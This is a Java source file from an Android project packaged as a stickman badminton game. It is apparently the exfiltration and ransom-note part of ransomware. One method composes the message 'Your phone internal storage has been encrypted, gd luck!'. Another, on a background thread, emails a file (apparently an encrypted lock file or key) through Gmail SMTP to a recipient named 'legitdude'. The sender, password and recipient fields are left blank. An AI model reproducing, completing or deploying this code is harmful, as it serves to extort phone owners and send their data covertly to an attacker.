package com.example.stickmanbadminton;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.widget.Toast;

import java.io.ByteArrayInputStream;
import java.io.File;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import javax.mail.Authenticator;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

import java.security.AccessController;
import java.security.Provider;
import java.security.Security;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;


public class email extends Authenticator{
    private File file;
    static {
        Security.addProvider(new JSSEProvider());
    }
    private String send = "";
//    private String subject ="key";
    private String text;
//    Uri uri =Uri.fromFile(new File(external.getSDcardpath() + "lock.enc"));
    email(String text , File file){
        this.text=text;
        this.file=file;
    }
    private List list = new LinkedList();

    public Intent sendemail(){
        this.text = "Your phone internal storage has been encrypted, gd luck!";
        Intent intent = new Intent(Intent.ACTION_SEND);
        intent.setType("text/plain");
        intent.putExtra(Intent.EXTRA_EMAIL,send);
        intent.putExtra(intent.EXTRA_TEXT,text);
        return intent;

    }
    public void smtp() throws Exception{
        if(!list.isEmpty()){
            this.list.remove(0);
            this.list.remove(1);
        }
        this.list.add(0,this.file);
        this.list.add(1,this.text);
        final List collection = Collections.synchronizedList(this.list);
        new Thread(new Runnable() {
            @Override
            public void run(){

                File file = (File) collection.get(0);
                String text = (String) collection.get(1);
                final String sender = "";
                final String password = "";
                final String legitdude = "";
                Properties props = new Properties();
                props.put("mail.smtp.host", "smtp.gmail.com"); //SMTP Host
                props.put("mail.smtp.port", "465"); //SMTP Port
                props.put("mail.smtp.auth", "true"); //Enabling SMTP Authentication
                props.put("mail.smtp.socketFactory.port", "465"); //SSL Port
                props.put("mail.smtp.socketFactory.class",
                        "javax.net.ssl.SSLSocketFactory"); //SSL Factory Class


                Session session  =  Session.getDefaultInstance(props, new Authenticator() {
                    @Override
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(sender,password);
                    }
                });
                MimeMessage message = new MimeMessage(session);
                DataSource source = new FileDataSource(file.getPath());
                DataHandler filee = new DataHandler(source);
                BodyPart feet = new MimeBodyPart();
                try{
                    feet.setDataHandler(filee);
                    feet.setFileName(file.getName());
                    BodyPart head = new MimeBodyPart();
                    head.setText(text);
                    Multipart part = new MimeMultipart();
                    part.addBodyPart(feet);
                    part.addBodyPart(head);
                    message.setContent(part);
                    message.setSender(new InternetAddress(sender));

                    message.setRecipient(Message.RecipientType.TO, new InternetAddress(legitdude));
                    Transport.send(message);
                }catch(MessagingException e){
                    e.printStackTrace();
                }

            }
        }).start();


    }
}
